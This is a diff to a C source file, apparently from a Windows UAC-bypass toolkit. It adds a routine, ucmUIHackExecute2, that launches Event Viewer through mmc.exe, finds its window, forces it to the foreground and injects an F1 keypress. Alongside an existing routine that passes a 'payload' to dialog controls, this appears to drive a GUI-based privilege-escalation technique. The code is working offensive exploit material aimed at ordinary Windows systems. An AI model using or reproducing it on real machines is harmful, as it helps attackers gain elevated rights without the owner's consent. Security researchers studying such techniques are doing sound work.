@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2019
+*  (C) COPYRIGHT AUTHORS, 2019 - 2024
 *
 *  TITLE:       UIHACKS.C
 *
-*  VERSION:     3.19
+*  VERSION:     3.66
 *
-*  DATE:        22 May 2019
+*  DATE:        03 Apr 2024
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -299,6 +299,66 @@ VOID ucmUIHackExecute(
             if (hwndDlg) {
                 EnumChildWindows(hwndDlg, ucmxEnumChildCallback, (LPARAM)lpPayload);
             }
+        }
+
+        TerminateProcess(shinfo.hProcess, 0);
+        CloseHandle(shinfo.hProcess);
+    }
+}
+
+/*
+* ucmUIHackExecute2
+*
+* Purpose:
+*
+* GUI hack target program via sending F1 key.
+*
+*/
+VOID ucmUIHackExecute2(
+    VOID
+)
+{
+    INPUT ip;
+    ULONG iRetry = 5;
+    SHELLEXECUTEINFO shinfo;
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    HWND hwnd;
+
+    _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
+    _strcat(szBuffer, SYSTEM32_DIR);
+    _strcat(szBuffer, MMC_EXE);
+
+    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+    shinfo.cbSize = sizeof(shinfo);
+    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+    shinfo.lpFile = szBuffer;
+    shinfo.lpParameters = EVENTVWR_MSC;
+    shinfo.nShow = SW_SHOW;
+    if (ShellExecuteEx(&shinfo)) {
+
+        do {
+            hwnd = FindWindow(L"MMCMainFrame", NULL);
+            if (hwnd)
+                break;
+            else {
+                Sleep(1000);
+            }
+        } while (--iRetry);
+
+        if (hwnd) {
+
+            SetForegroundWindow(hwnd);
+
+            ip.type = INPUT_KEYBOARD;
+            ip.ki.wScan = 0;
+            ip.ki.time = 0;
+            ip.ki.dwExtraInfo = 0;
+            ip.ki.dwFlags = 0;
+
+            ip.ki.wVk = VK_F1;
+            ucmxSendInput(1, &ip, sizeof(INPUT));
+            Sleep(1000);
         }
 
         TerminateProcess(shinfo.hProcess, 0);
